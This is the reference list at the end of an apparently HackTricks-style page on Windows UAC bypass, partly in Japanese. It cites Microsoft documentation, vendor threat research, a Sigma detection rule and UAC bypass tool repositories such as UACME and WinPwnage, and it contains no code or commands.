## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – User Account Control の仕組み](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – UAC bypass techniques のコレクション](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – UAC bypass の互換性スキャナーおよびランチャー](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI、AI を導入して PowerShell backdoor を生成](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: 東南アジア政府の標的に対する 0-Day Exploitation](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Windows Administrator Protection の bypass](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – SilentCleanup Task を使用した Bypass UAC](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – UnifiedConsent、TabTip、Narrator の Always Notify bypass](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Administrator protection](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – .NET から Local Windows RPC Servers を呼び出す](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte、Signed Windows Kernel Rootkit で CoolClient を強化](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
{{#include ../../banners/hacktricks-training.md}}
